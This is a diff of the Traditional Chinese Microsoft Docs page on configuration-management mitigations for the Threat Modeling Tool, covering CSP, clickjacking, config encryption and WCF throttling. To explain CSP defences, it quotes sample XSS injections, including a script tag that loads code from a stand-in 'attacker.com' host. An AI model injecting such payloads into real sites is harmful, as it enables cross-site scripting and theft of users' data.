@@ -1,24 +1,25 @@
 ---
-title: "組態管理 - Microsoft Threat Modeling Tool - Azure | Microsoft Docs"
-description: "降低威脅模型化工具所暴露的威脅"
+title: 組態管理 - Microsoft Threat Modeling Tool - Azure | Microsoft Docs
+description: 降低威脅模型化工具所暴露的威脅
 services: security
 documentationcenter: na
-author: RodSan
-manager: RodSan
-editor: RodSan
+author: jegeib
+manager: jegeib
+editor: jegeib
 ms.assetid: na
 ms.service: security
 ms.workload: na
 ms.tgt_pltfrm: na
 ms.devlang: na
 ms.topic: article
-ms.date: 08/17/2017
-ms.author: rodsan
-ms.openlocfilehash: 1f3de9ba6615a9b2232cca237a822b308d89426d
-ms.sourcegitcommit: 9890483687a2b28860ec179f5fd0a292cdf11d22
+ms.date: 02/07/2017
+ms.author: jegeib
+ms.openlocfilehash: 07a86345e49081320663d7706310a71a40ace134
+ms.sourcegitcommit: 1fb353cfca800e741678b200f23af6f31bd03e87
 ms.translationtype: HT
 ms.contentlocale: zh-TW
-ms.lasthandoff: 01/24/2018
+ms.lasthandoff: 08/30/2018
+ms.locfileid: "43302102"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>安全框架︰組態管理 | 緩和措施 
 | 產品/服務 | 文章 |
@@ -41,8 +42,8 @@ ms.lasthandoff: 01/24/2018
 | **SDL 階段**               | 建置 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
-| **參考**              | [內容安全性原則簡介](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[內容安全性原則參考](http://content-security-policy.com/)、[安全性功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[內容安全性原則簡介](https://docs.webplatform.org/wiki/tutorials/content-security-policy)、[我可以使用 CSP 嗎？](http://caniuse.com/#feat=contentsecuritypolicy) |
-| **步驟** | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是以白名單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰**如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 此入侵將因為 CSP 的基礎限制 1 而無法運作</li><li>插入 `<script src=”http://attacker.com/maliciousCode.js”/>`。 此入侵無法運作，因為攻擊者所控制的網域不在網域的 CSP 白名單中</li></ul></li><li>**控制資料外洩︰**如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標網域不在 CSP 的白名單中</li><li>**防禦點擊劫持：**點擊劫持 (Clickjacking) 是一種攻擊技巧，敵人可用來建構真正的網站並強制使用者點按 UI 項目。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰**如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |
+| **參考**              | [內容安全性原則簡介](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[內容安全性原則參考](http://content-security-policy.com/)、[安全性功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[內容安全性原則簡介](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[我可以使用 CSP 嗎？](http://caniuse.com/#feat=contentsecuritypolicy) |
+| **步驟** | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是以允許清單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰** 如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 此入侵將因為 CSP 的基礎限制 1 而無法運作</li><li>插入 `<script src=”http://attacker.com/maliciousCode.js”/>`。 此入侵無法運作，因為攻擊者所控制的網域不在網域的 CSP 白名單中</li></ul></li><li>**控制資料外洩︰** 如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標網域不在 CSP 的允許清單中</li><li>**防禦點擊劫持：** 點擊劫持 (Clickjacking) 是一種攻擊技巧，敵人可用來建構真正的網站並強制使用者點按 UI 項目。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰** 如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |
 
 ### <a name="example"></a>範例
 範例原則︰ 
@@ -106,7 +107,7 @@ Example: var str="alert(1)"; eval(str);
 | **SDL 階段**               | 建置 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
-| **參考**              | [OWASP 點擊劫持防禦功能提要](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet)、[IE 內部 - 使用 X-Frame-Options 對抗點擊劫持](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
+| **參考**              | [OWASP 點擊劫持防禦功能提要](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet)、[IE 內部 - 使用 X-Frame-Options 對抗點擊劫持](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
 | **步驟** | <p>點擊劫持 (Clickjacking) 也稱為「UI 偽裝攻擊」，當使用者打算按一下最上層頁面時，攻擊者會使用多重透明或不透明層級來誘騙使用者按一下另一個頁面上的按鈕或連結。</p><p>使用 iframe 製作惡意頁面，以載入受害者的頁面，即可達成此分層處理。 因此，攻擊者會「劫持」頁面所需的點擊，並將其路由傳送至另一個頁面，該頁面最可能由另一個應用程式、網域或兩者所擁有。 若要避免點擊劫持攻擊，請設定適當的 X-Frame-Options HTTP 回應標頭，以指示瀏覽器不允許從其他網域進行框架處理</p>|
 
 ### <a name="example"></a>範例
@@ -481,7 +482,7 @@ public void ConfigureServices(IServiceCollection services)
 | 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web API | 
-| **SDL 階段**               | Deployment |  
+| **SDL 階段**               | 部署 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
 | **參考**              | [作法：在 ASP.NET 2.0 中使用 DPAPI 加密組態區段](https://msdn.microsoft.com/library/ff647398.aspx)、[指定受保護的組態提供者](https://msdn.microsoft.com/library/68ze1hb2.aspx)、[使用 Azure Key Vault 來保護應用程式的機密資訊](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
@@ -492,7 +493,7 @@ public void ConfigureServices(IServiceCollection services)
 | 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | IoT 裝置 | 
-| **SDL 階段**               | Deployment |  
+| **SDL 階段**               | 部署 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
 | **參考**              | N/A  |
@@ -525,7 +526,7 @@ public void ConfigureServices(IServiceCollection services)
 | 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | IoT 裝置 | 
-| **SDL 階段**               | Deployment |  
+| **SDL 階段**               | 部署 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
 | **參考**              | N/A  |
@@ -536,7 +537,7 @@ public void ConfigureServices(IServiceCollection services)
 | 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | IoT 現場閘道 | 
-| **SDL 階段**               | Deployment |  
+| **SDL 階段**               | 部署 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
 | **參考**              | N/A  |
@@ -547,7 +548,7 @@ public void ConfigureServices(IServiceCollection services)
 | 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | IoT 現場閘道 | 
-| **SDL 階段**               | Deployment |  
+| **SDL 階段**               | 部署 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
 | **參考**              | N/A  |
@@ -561,7 +562,7 @@ public void ConfigureServices(IServiceCollection services)
 | **SDL 階段**               | 建置 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | 閘道選擇 - Azure IoT 中樞 |
-| **參考**              | [IoT 中樞裝置管理概觀](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/)、[如何更新裝置韌體](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
+| **參考**              | [IoT 中樞裝置管理概觀](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/)、[如何更新裝置韌體](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
 | **步驟** | LWM2M 是來自 Open Mobile Alliance 且適用於 IoT 裝置管理的通訊協定。 Azure IoT 裝置管理可讓您使用裝置工作來與實體裝置進行互動。 確保雲端閘道會實作相關程序，以使用 Azure IoT 中樞裝置管理讓裝置和其他組態資料常保最新狀態。 |
 
 ## <a id="controls-policies"></a>確保裝置已根據組織的原則設定端點安全性控制項
@@ -569,7 +570,7 @@ public void ConfigureServices(IServiceCollection services)
 | 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | 電腦信任邊界 | 
-| **SDL 階段**               | Deployment |  
+| **SDL 階段**               | 部署 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
 | **參考**              | N/A  |
@@ -580,7 +581,7 @@ public void ConfigureServices(IServiceCollection services)
 | 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Azure 儲存體 | 
-| **SDL 階段**               | Deployment |  
+| **SDL 階段**               | 部署 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
 | **參考**              | [Azure 儲存體安全性指南 - 管理儲存體帳戶金鑰](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
@@ -605,8 +606,8 @@ public void ConfigureServices(IServiceCollection services)
 | **SDL 階段**               | 建置 |  
 | **適用的技術** | .NET Framework 3 |
 | **屬性**              | N/A  |
-| **參考**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx)、[Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
-| **步驟** | <p>未設定系統資源的使用限制，可能會導致資源耗盡，而最後導致拒絕服務。</p><ul><li>**說明︰**Windows Communication Foundation (WCF) 提供服務要求節流的功能。 允許太多的用戶端要求可能會淹沒系統及耗盡其資源。 另一方面，只允許服務有少數要求可防止合法使用者使用此服務。 每項服務應個別調整並設定為允許適當的資源數量。</li><li>**建議** 啟用 WCF 的服務節流功能以及為應用程式設定適當的限制。</li></ul>|
+| **參考**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx)、[Fortify Kingdom](https://vulncat.fortify.com) |
+| **步驟** | <p>未設定系統資源的使用限制，可能會導致資源耗盡，而最後導致拒絕服務。</p><ul><li>**說明︰** Windows Communication Foundation (WCF) 提供服務要求節流的功能。 允許太多的用戶端要求可能會淹沒系統及耗盡其資源。 另一方面，只允許服務有少數要求可防止合法使用者使用此服務。 每項服務應個別調整並設定為允許適當的資源數量。</li><li>**建議** 啟用 WCF 的服務節流功能以及為應用程式設定適當的限制。</li></ul>|
 
 ### <a name="example"></a>範例
 下列是已啟用節流的範例組態︰
@@ -628,7 +629,7 @@ public void ConfigureServices(IServiceCollection services)
 | **SDL 階段**               | 建置 |  
 | **適用的技術** | .NET Framework 3 |
 | **屬性**              | N/A  |
-| **參考**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx)、[Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
+| **參考**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx)、[Fortify Kingdom](https://vulncat.fortify.com) |
 | **步驟** | 中繼資料可協助攻擊者了解系統及規劃攻擊形式。 可以將 WCF 服務設定為公開中繼資料。 中繼資料可提供詳細的服務描述資訊，且不得在生產環境中廣播。 ServiceMetaData 類別的 `HttpGetEnabled` / `HttpsGetEnabled` 屬性會定義服務是否會公開中繼資料 | 
 
 ### <a name="example"></a>範例
